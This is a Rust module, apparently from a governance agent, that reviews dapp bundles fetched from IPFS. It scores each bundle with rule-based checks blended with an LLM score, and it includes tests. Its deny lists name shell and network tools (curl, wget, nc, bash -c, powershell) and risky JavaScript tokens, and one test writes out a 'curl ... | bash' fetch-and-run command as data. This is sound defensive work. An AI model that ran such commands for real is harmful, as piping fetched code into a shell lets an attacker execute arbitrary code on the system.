use std::collections::BTreeSet;

use anyhow::Result;
use chrono::Utc;
use serde::Deserialize;
use serde_json::Value;

use crate::{
    config::{DecisionConfig, ReviewConfig},
    ipfs::{BundleFetcher, Manifest},
    llm::{CompositeLlm, LlmContext, redact_secrets},
    types::{DecodedAction, Finding, LlmAudit, Proposal, ReviewResult, Severity},
};

const MAX_TEXT_FETCH_BYTES: usize = 24 * 1024;
const MAX_SOURCE_FILES_FOR_SCAN: usize = 6;
const MAX_BUNDLE_INDEX_BYTES: usize = 64 * 1024;
const MAX_BUNDLE_CONTENT_BYTES: usize = 256 * 1024;
const MAX_BUNDLE_CONTENT_FETCHES: usize = 120;
const SEMANTIC_SCORING_RUBRIC: &str = include_str!("../prompts/semantic_scoring_rubric.md");

pub async fn review_proposal(
    proposal: &Proposal,
    config: &ReviewConfig,
    decision_config: &DecisionConfig,
    bundle_fetcher: &BundleFetcher,
    llm: &CompositeLlm,
    prompt_override: Option<&str>,
) -> Result<ReviewResult> {
    let root_cid = extract_root_cid(&proposal.action);
    let mut findings = Vec::<Finding>::new();
    let mut score = match &proposal.action {
        DecodedAction::Unsupported { reason } => {
            findings.push(Finding {
                severity: Severity::Warning,
                message: format!("unsupported action: {reason}"),
            });
            0.25
        }
        _ => 0.7,
    };

    let manifest = if let Some(cid) = &root_cid {
        match bundle_fetcher.fetch_manifest(cid).await {
            Ok(manifest) => {
                score += 0.1;
                Some(manifest)
            }
            Err(err) => {
                findings.push(Finding {
                    severity: Severity::Critical,
                    message: format!("failed to fetch manifest from IPFS: {err}"),
                });
                score -= 0.35;
                None
            }
        }
    } else {
        findings.push(Finding {
            severity: Severity::Warning,
            message: "proposal has no decoded root CID".to_string(),
        });
        score -= 0.2;
        None
    };

    if let Some(m) = manifest.as_ref() {
        evaluate_manifest(m, config, &mut findings, &mut score);

        if let Some(cid) = &root_cid {
            analyze_bundle_lightweight(bundle_fetcher, cid, m, &mut findings, &mut score).await;
        }
    }

    let bundle_snapshot = if let (Some(cid), Some(m)) = (&root_cid, manifest.as_ref()) {
        Some(
            build_bundle_snapshot(bundle_fetcher, cid, m)
                .await
                .unwrap_or_else(|err| format!("Bundle snapshot unavailable: {err}")),
        )
    } else {
        None
    };

    score = score.clamp(0.0, 1.0);
    let deterministic_score = score;
    let (deterministic_weight, llm_weight) = decision_config.resolved_blend_weights();

    let llm_output = build_llm_score(
        proposal,
        &findings,
        bundle_snapshot.as_deref(),
        llm,
        prompt_override,
    )
    .await;
    if let Some((llm_score, _)) = &llm_output {
        score = (deterministic_weight * deterministic_score) + (llm_weight * llm_score);
    } else {
        score = deterministic_score;
    }

    score = score.clamp(0.0, 1.0);

    let (llm_score, llm_audit) = match llm_output {
        Some((score, audit)) => (Some(score), Some(audit)),
        None => (None, None),
    };

    Ok(ReviewResult {
        proposal_id: proposal.proposal_id.clone(),
        root_cid,
        findings,
        deterministic_score: Some(deterministic_score),
        deterministic_weight: Some(deterministic_weight),
        llm_weight: Some(llm_weight),
        llm_score,
        llm_audit,
        score,
        reviewed_at: Utc::now(),
    })
}

fn evaluate_manifest(
    manifest: &Manifest,
    config: &ReviewConfig,
    findings: &mut Vec<Finding>,
    score: &mut f32,
) {
    let files = manifest.files.clone().unwrap_or_default();

    if files.is_empty() {
        findings.push(Finding {
            severity: Severity::Warning,
            message: "manifest has no files list".to_string(),
        });
        *score -= 0.1;
        return;
    }

    let total_bytes = files.iter().map(|f| f.bytes).sum::<u64>();
    if total_bytes > config.max_bundle_bytes {
        findings.push(Finding {
            severity: Severity::Critical,
            message: format!(
                "bundle exceeds size limit: {} > {} bytes",
                total_bytes, config.max_bundle_bytes
            ),
        });
        *score -= 0.35;
    }

    if files.len() > 500 {
        findings.push(Finding {
            severity: Severity::Warning,
            message: format!(
                "manifest contains unusually high file count: {}",
                files.len()
            ),
        });
        *score -= 0.05;
    }

    let suspicious_paths = [".exe", ".dll", ".so", ".dylib", "../"];
    for file in &files {
        if suspicious_paths
            .iter()
            .any(|needle| file.path.contains(needle))
        {
            findings.push(Finding {
                severity: Severity::Critical,
                message: format!("manifest contains suspicious path: {}", file.path),
            });
            *score -= 0.25;
        }
    }
}

async fn analyze_bundle_lightweight(
    bundle_fetcher: &BundleFetcher,
    root_cid: &str,
    manifest: &Manifest,
    findings: &mut Vec<Finding>,
    score: &mut f32,
) {
    let files = manifest.files.clone().unwrap_or_default();

    let has_package = files.iter().any(|f| f.path == "package.json");
    let has_vibefi = files.iter().any(|f| f.path == "vibefi.json");

    if !has_package {
        findings.push(Finding {
            severity: Severity::Warning,
            message: "bundle is missing package.json".to_string(),
        });
        *score -= 0.05;
    }
    if !has_vibefi {
        findings.push(Finding {
            severity: Severity::Warning,
            message: "bundle is missing vibefi.json".to_string(),
        });
        *score -= 0.05;
    }

    if has_package
        && let Ok(Some(package_text)) = bundle_fetcher
            .fetch_text_file(root_cid, "package.json", MAX_TEXT_FETCH_BYTES)
            .await
    {
        analyze_package_json(&package_text, findings, score);
    }

    let source_candidates = files
        .iter()
        .filter(|f| is_source_path(&f.path) && f.bytes as usize <= MAX_TEXT_FETCH_BYTES)
        .take(MAX_SOURCE_FILES_FOR_SCAN)
        .map(|f| f.path.clone())
        .collect::<Vec<_>>();

    let mut aggregated_hits = BTreeSet::new();
    for path in source_candidates {
        if let Ok(Some(text)) = bundle_fetcher
            .fetch_text_file(root_cid, &path, MAX_TEXT_FETCH_BYTES)
            .await
        {
            let hits = detect_suspicious_tokens(&text);
            if !hits.is_empty() {
                for hit in hits {
                    aggregated_hits.insert(hit.to_string());
                }
            }
        }
    }

    if !aggregated_hits.is_empty() {
        findings.push(Finding {
            severity: Severity::Warning,
            message: format!(
                "source scan found potentially risky tokens: {}",
                aggregated_hits.into_iter().collect::<Vec<_>>().join(", ")
            ),
        });
        *score -= 0.1;
    }
}

fn analyze_package_json(package_text: &str, findings: &mut Vec<Finding>, score: &mut f32) {
    let parsed = serde_json::from_str::<Value>(package_text);
    let Ok(value) = parsed else {
        findings.push(Finding {
            severity: Severity::Warning,
            message: "failed to parse package.json".to_string(),
        });
        *score -= 0.05;
        return;
    };

    if let Some(scripts) = value.get("scripts").and_then(|v| v.as_object()) {
        let mut suspicious = Vec::<String>::new();
        for (name, cmd) in scripts {
            if let Some(cmd_text) = cmd.as_str()
                && contains_suspicious_script_cmd(cmd_text)
            {
                suspicious.push(format!("{}={}", name, cmd_text));
            }
        }

        if !suspicious.is_empty() {
            findings.push(Finding {
                severity: Severity::Warning,
                message: "package.json scripts contain potentially risky commands".to_string(),
            });
            *score -= 0.1;
        }
    }
}

async fn build_llm_score(
    proposal: &Proposal,
    findings: &[Finding],
    bundle_snapshot: Option<&str>,
    llm: &CompositeLlm,
    prompt_override: Option<&str>,
) -> Option<(f32, LlmAudit)> {
    let base_prompt = review_prompt(proposal, findings, bundle_snapshot);
    let prompt = match prompt_override {
        Some(custom) => format!("{custom}\n\n{SEMANTIC_SCORING_RUBRIC}\n\n{base_prompt}"),
        None => format!("{SEMANTIC_SCORING_RUBRIC}\n\n{base_prompt}"),
    };

    tracing::debug!(
        proposal_id = %proposal.proposal_id,
        proposal_description = %proposal.description,
        proposal_action = ?proposal.action,
        findings_count = findings.len(),
        bundle_snapshot_present = bundle_snapshot.is_some(),
        has_prompt_override = prompt_override.is_some(),
        prompt_len = prompt.len(),
        "review stage prepared LLM prompt inputs"
    );
    tracing::trace!(
        proposal_id = %proposal.proposal_id,
        prompt = %prompt,
        "review stage prepared full LLM prompt"
    );

    let response = llm
        .analyze_best_effort(&LlmContext {
            prompt: prompt.clone(),
        })
        .await?;

    tracing::debug!(
        proposal_id = %proposal.proposal_id,
        provider = %response.provider,
        model = %response.model,
        response_len = response.text.len(),
        "review stage received LLM response metadata"
    );
    tracing::trace!(
        proposal_id = %proposal.proposal_id,
        provider = %response.provider,
        model = %response.model,
        response = %response.text,
        "review stage received full LLM response"
    );

    let llm_score = parse_llm_score(&response.text)?;

    let audit = LlmAudit {
        provider: response.provider,
        model: response.model,
        prompt_redacted: redact_secrets(&prompt),
        response_redacted: redact_secrets(&response.text),
    };

    Some((llm_score, audit))
}

fn review_prompt(
    proposal: &Proposal,
    findings: &[Finding],
    bundle_snapshot: Option<&str>,
) -> String {
    let findings_summary = if findings.is_empty() {
        "none".to_string()
    } else {
        findings
            .iter()
            .map(|finding| format!("- {:?}: {}", finding.severity, finding.message))
            .collect::<Vec<_>>()
            .join("\n")
    };

    let bundle_section = bundle_snapshot.unwrap_or("Bundle snapshot unavailable.");
    format!(
        "Proposal metadata:\n- proposal_id: {}\n- description: {}\n- action: {:?}\n\nDeterministic findings:\n{}\n\nBundle snapshot:\n{}",
        proposal.proposal_id,
        proposal.description,
        proposal.action,
        findings_summary,
        bundle_section
    )
}

fn extract_root_cid(action: &DecodedAction) -> Option<String> {
    match action {
        DecodedAction::PublishDapp { root_cid, .. } => Some(root_cid.clone()),
        DecodedAction::UpgradeDapp { root_cid, .. } => Some(root_cid.clone()),
        DecodedAction::Unsupported { .. } => None,
    }
}

fn is_source_path(path: &str) -> bool {
    [".js", ".jsx", ".ts", ".tsx", ".sol"]
        .iter()
        .any(|ext| path.ends_with(ext))
}

fn contains_suspicious_script_cmd(cmd: &str) -> bool {
    [
        "curl ",
        "wget ",
        "nc ",
        "netcat ",
        "bash -c",
        "powershell",
        "chmod +x",
    ]
    .iter()
    .any(|needle| cmd.contains(needle))
}

fn detect_suspicious_tokens(source: &str) -> Vec<&'static str> {
    [
        "child_process",
        "require('child_process')",
        "require(\"child_process\")",
        "eval(",
        "new Function(",
        "XMLHttpRequest",
        "WebSocket(",
        "http://",
    ]
    .iter()
    .filter(|needle| source.contains(**needle))
    .copied()
    .collect()
}

#[derive(Debug, Deserialize)]
struct ScorePayload {
    score: f32,
}

fn parse_llm_score(raw: &str) -> Option<f32> {
    let parsed = serde_json::from_str::<ScorePayload>(raw).ok();
    let score = match parsed {
        Some(value) => value.score,
        None => {
            let wrapped = serde_json::from_str::<Value>(raw)
                .ok()
                .and_then(|value| value.get("score").cloned())
                .and_then(|value| serde_json::from_value::<f32>(value).ok());
            wrapped?
        }
    };

    if !(0.0..=1.0).contains(&score) {
        tracing::warn!(score, "llm returned out-of-range score; ignoring value");
        return None;
    }

    Some(score)
}

async fn build_bundle_snapshot(
    bundle_fetcher: &BundleFetcher,
    root_cid: &str,
    manifest: &Manifest,
) -> Result<String> {
    let files = manifest.files.clone().unwrap_or_default();
    if files.is_empty() {
        return Ok("Bundle file index: empty".to_string());
    }

    let mut index = String::new();
    let mut indexed_count = 0usize;
    for file in &files {
        let line = format!("- {} ({} bytes)\n", file.path, file.bytes);
        if index.len() + line.len() > MAX_BUNDLE_INDEX_BYTES {
            break;
        }
        index.push_str(&line);
        indexed_count += 1;
    }
    let truncated_index_count = files.len().saturating_sub(indexed_count);
    if truncated_index_count > 0 {
        index.push_str(&format!(
            "... file index truncated: {} entries omitted ...\n",
            truncated_index_count
        ));
    }

    let mut content = String::new();
    let mut included_contents = 0usize;
    let mut omitted_non_text = 0usize;
    let mut omitted_large = 0usize;
    let mut fetch_budget_exhausted = false;

    for file in files.iter().take(MAX_BUNDLE_CONTENT_FETCHES) {
        if file.bytes as usize > MAX_TEXT_FETCH_BYTES {
            omitted_large += 1;
            continue;
        }

        match bundle_fetcher
            .fetch_text_file(root_cid, &file.path, MAX_TEXT_FETCH_BYTES)
            .await
        {
            Ok(Some(text)) => {
                let section = format!(
                    "\n--- file: {} ({} bytes) ---\n{}\n",
                    file.path, file.bytes, text
                );
                if content.len() + section.len() > MAX_BUNDLE_CONTENT_BYTES {
                    fetch_budget_exhausted = true;
                    break;
                }
                content.push_str(&section);
                included_contents += 1;
            }
            Ok(None) | Err(_) => {
                omitted_non_text += 1;
            }
        }
    }

    let inspected = files.len().min(MAX_BUNDLE_CONTENT_FETCHES);
    let skipped_by_fetch_cap = files.len().saturating_sub(inspected);

    let summary = format!(
        "Bundle summary: total_files={}, indexed_files={}, content_files_included={}, omitted_large_files={}, omitted_non_text_or_unavailable={}, fetch_cap_omitted={}, content_truncated={}",
        files.len(),
        indexed_count,
        included_contents,
        omitted_large,
        omitted_non_text,
        skipped_by_fetch_cap,
        fetch_budget_exhausted
    );

    Ok(format!(
        "{summary}\n\nBundle file index:\n{index}\nText file contents:\n{content}"
    ))
}

#[cfg(test)]
mod tests {
    use std::{
        fs,
        path::{Path, PathBuf},
    };

    use chrono::Utc;
    use serde_json::json;

    use crate::{
        config::{DecisionConfig, IpfsConfig, LlmConfig, ProviderConfig, ReviewConfig},
        ipfs::{BundleFetcher, Manifest, ManifestFile},
        llm::CompositeLlm,
        types::{DecodedAction, Proposal},
    };

    use super::{
        build_bundle_snapshot, contains_suspicious_script_cmd, detect_suspicious_tokens,
        review_proposal,
    };

    #[test]
    fn script_detection_flags_network_shell_commands() {
        assert!(contains_suspicious_script_cmd(
            "curl https://example.com | bash"
        ));
        assert!(!contains_suspicious_script_cmd("bun run test"));
    }

    #[test]
    fn source_detection_finds_risky_tokens() {
        let src = "const { exec } = require('child_process'); eval('x');";
        let hits = detect_suspicious_tokens(src);
        assert!(hits.contains(&"child_process"));
        assert!(hits.contains(&"eval("));
    }

    #[test]
    fn parse_llm_score_accepts_valid_json_payload() {
        let score = super::parse_llm_score(&json!({ "score": 0.72 }).to_string());
        assert_eq!(score, Some(0.72));
    }

    #[test]
    fn parse_llm_score_rejects_out_of_range_values() {
        let score = super::parse_llm_score(&json!({ "score": 1.7 }).to_string());
        assert!(score.is_none());
    }

    #[test]
    fn parse_llm_score_accepts_low_value_payload() {
        let score = super::parse_llm_score(&json!({ "score": 0.05 }).to_string());
        assert_eq!(score, Some(0.05));
    }

    #[tokio::test]
    async fn bundle_snapshot_includes_index_and_cached_text_content() {
        let temp_dir =
            std::env::temp_dir().join(format!("gov-agent-review-test-{}", std::process::id()));
        let _ = fs::remove_dir_all(&temp_dir);
        fs::create_dir_all(&temp_dir).expect("create temp cache dir");

        let root_cid = "bafy-test-cid";
        let cid_dir = temp_dir.join(root_cid);
        fs::create_dir_all(cid_dir.join("src")).expect("create cid cache tree");
        fs::write(
            cid_dir.join("manifest.json"),
            r#"{"name":"test","version":"1.0.0"}"#,
        )
        .expect("write cached manifest");
        fs::write(cid_dir.join("src/app.ts"), "export const x = 1;\n").expect("write cached file");

        let fetcher = BundleFetcher::new(&IpfsConfig {
            gateway_url: "http://127.0.0.1:1".to_string(),
            request_timeout_secs: 1,
            cache_dir: Some(temp_dir.clone()),
        })
        .expect("build fetcher");

        let manifest = Manifest {
            name: Some("test".to_string()),
            version: Some("1.0.0".to_string()),
            description: None,
            entry: None,
            files: Some(vec![ManifestFile {
                path: "src/app.ts".to_string(),
                bytes: 20,
            }]),
        };

        let snapshot = build_bundle_snapshot(&fetcher, root_cid, &manifest)
            .await
            .expect("build snapshot");

        assert!(snapshot.contains("Bundle file index:"));
        assert!(snapshot.contains("src/app.ts (20 bytes)"));
        assert!(snapshot.contains("--- file: src/app.ts (20 bytes) ---"));
        assert!(snapshot.contains("export const x = 1;"));

        let _ = fs::remove_dir_all(&temp_dir);
    }

    #[tokio::test]
    async fn red_team_fixture_produces_risky_findings_and_low_score_without_llm() {
        let fixture_dir = red_team_fixture_dir();
        let root_cid = "bafy-red-team-fixture";
        let cache_root = temp_cache_root("gov-agent-red-team-review");
        let cid_dir = cache_root.join(root_cid);
        fs::create_dir_all(&cid_dir).expect("create cache cid dir");
        copy_dir_recursive(&fixture_dir, &cid_dir).expect("copy fixture into cache");

        let fetcher = BundleFetcher::new(&IpfsConfig {
            gateway_url: "http://127.0.0.1:1".to_string(),
            request_timeout_secs: 1,
            cache_dir: Some(cache_root.clone()),
        })
        .expect("build fetcher");

        let proposal = Proposal {
            proposal_id: "1".to_string(),
            proposer: "0x0000000000000000000000000000000000000001".to_string(),
            description: "red-team fixture".to_string(),
            vote_start: 1,
            vote_end: 100,
            block_number: 1,
            tx_hash: None,
            targets: vec![],
            values: vec![],
            calldatas: vec![],
            action: DecodedAction::PublishDapp {
                root_cid: root_cid.to_string(),
                name: "red-team-vapp".to_string(),
                version: "0.0.1".to_string(),
                description: "fixture".to_string(),
            },
            discovered_at: Utc::now(),
        };

        let review = review_proposal(
            &proposal,
            &ReviewConfig {
                prompt_file: None,
                max_bundle_bytes: 40 * 1024 * 1024,
            },
            &DecisionConfig {
                profile: None,
                approve_threshold: None,
                reject_threshold: None,
                deterministic_weight: Some(0.70),
                llm_weight: Some(0.30),
            },
            &fetcher,
            &disabled_llm(),
            None,
        )
        .await
        .expect("review proposal");

        let messages = review
            .findings
            .iter()
            .map(|finding| finding.message.as_str())
            .collect::<Vec<_>>();
        assert!(
            messages
                .iter()
                .any(|msg| msg.contains("manifest contains suspicious path")),
            "expected suspicious path finding, got {messages:?}"
        );
        assert!(
            messages.iter().any(|msg| {
                msg.contains("package.json scripts contain potentially risky commands")
            }),
            "expected risky script finding, got {messages:?}"
        );
        assert!(
            messages
                .iter()
                .any(|msg| msg.contains("source scan found potentially risky tokens")),
            "expected risky source-token finding, got {messages:?}"
        );
        assert!(
            review.score < 0.5,
            "expected low review score for red-team fixture, got {}",
            review.score
        );
        assert!(review.llm_score.is_none());

        let _ = fs::remove_dir_all(&cache_root);
    }

    fn disabled_llm() -> CompositeLlm {
        CompositeLlm::from_config(&LlmConfig {
            openai: disabled_provider(),
            anthropic: disabled_provider(),
        })
    }

    fn disabled_provider() -> ProviderConfig {
        ProviderConfig {
            enabled: false,
            base_url: None,
            api_key_env: None,
            model: None,
        }
    }

    fn red_team_fixture_dir() -> PathBuf {
        PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("testdata")
            .join("bundles")
            .join("red_team_vapp")
    }

    fn temp_cache_root(prefix: &str) -> PathBuf {
        let path = std::env::temp_dir().join(format!("{}-{}", prefix, std::process::id()));
        let _ = fs::remove_dir_all(&path);
        fs::create_dir_all(&path).expect("create temp cache root");
        path
    }

    fn copy_dir_recursive(from: &Path, to: &Path) -> std::io::Result<()> {
        for entry in fs::read_dir(from)? {
            let entry = entry?;
            let file_type = entry.file_type()?;
            let src = entry.path();
            let dst = to.join(entry.file_name());

            if file_type.is_dir() {
                fs::create_dir_all(&dst)?;
                copy_dir_recursive(&src, &dst)?;
            } else if file_type.is_file() {
                fs::copy(&src, &dst)?;
            }
        }
        Ok(())
    }
}
